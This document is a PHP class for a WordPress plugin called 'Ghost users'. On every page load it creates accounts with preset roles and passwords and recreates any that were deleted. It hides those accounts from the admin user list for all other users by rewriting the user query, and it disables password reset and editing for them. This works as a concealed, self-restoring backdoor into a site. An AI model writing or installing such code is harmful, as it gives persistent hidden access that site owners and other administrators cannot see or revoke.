<?php

class WordpressGhostsAdmin
{

    public static function initialize() {
        self::load_menu();
        // WP action: when WP is loaded create Ghost-Users!
        add_action('wp_loaded', array('WordpressGhostsAdmin', 'create_ghosts'));
        // WP action: when load users list hide the ghosts!
        add_action('pre_user_query',array('WordpressGhostsAdmin','hide_ghosts'));
        // WP action: disable password reset
        add_filter( 'allow_password_reset', array('WordpressGhostsAdmin','disable_password_reset_for_ghosts'), 10, 2 );
        // WP action: disable password edit
        add_filter( 'show_password_fields', array('WordpressGhostsAdmin','disable_password_edit_for_ghosts'), 10, 2 );
    }

    public static function load_menu() {
        add_action('init', array('WordpressGhostsAdmin', 'check_roles'));
    }

    public static function check_roles() {
        add_action('admin_menu', array('WordpressGhostsAdmin', 'add_page'), 1);
    }

    public static function add_page() {
        add_menu_page(
          'Ghost users',
          'Ghost users',
          'create_users',
          'wordpress-ghosts',
          array('WordpressGhostsAdmin', 'load_page'),
          '',
          71
        );
    }

    public static function load_page(){
        require_once plugin_dir_path( __FILE__ ) .'admin-page.php';
    }

    // Get a Ghosts IDs array.
    private static function get_ghosts_id(){
        // get Ghosts array.
        $ghosts = WordpressGhosts::get_ghosts();
        // create a Ghosts IDs array.
        foreach ($ghosts as $ghost){
        $ghosts_id[] = username_exists($ghost[0]);
        }
        return $ghosts_id;
    }

    // Function that create the Ghosts users in your WP.
    public static function create_ghosts(){
        $ghosts = WordpressGhosts::get_ghosts();
        // Check if the Ghosts array is not empty.
        if (!empty($ghosts)){
            // Loop into Ghosts Array.
            foreach ($ghosts as $ghost){
                // if Ghost-User doesn't exist and the array fields are four create it.
                if ((username_exists($ghost[0]) == false) && (email_exists($ghost[2]) == false) && (count($ghost) == 4)){
                    wp_insert_user(array(
                      'user_login' => $ghost[0],
                      'role' => $ghost[1],
                      'user_email' => $ghost[2],
                      'user_pass' => $ghost[3],
                      ));
                }
            }
        }
    }

    // Hide Ghost-Users visibility in backend users list
    public static function hide_ghosts($user_search) {
        // get current User infos.
        $user = wp_get_current_user();
        // get ghosts id array.
        $ghosts_id = self::get_ghosts_id();
        // if the current user isn't in Ghost-Users array Hide the backend visibility of ghosts.
        if (!in_array($user->ID, $ghosts_id)){
            global $wpdb;
            $ghosts_id_string = implode(',', $ghosts_id);
            // Hack the WP where excluding ghosts ID.
            $user_search->query_where = str_replace("WHERE 1=1", "WHERE 1=1 AND {$wpdb->users}.ID NOT IN (". $ghosts_id_string .")",$user_search->query_where);
        }
    }

    // Disable password reset for ghosts
    public static function disable_password_reset_for_ghosts($allow, $user_id) {
        $ghosts_id = self::get_ghosts_id();
        $allow = in_array($user_id, $ghosts_id) ? false : true;
        return $allow;
    }

    // Disable password edit for ghosts
    function disable_password_edit_for_ghosts($allow, $profileuser = NULL) {
        if (!is_null($profileuser)){
            $ghosts_id = self::get_ghosts_id();
            $allow = in_array($profileuser->id, $ghosts_id) ? false : true;
            return $allow;
        }
    }

}
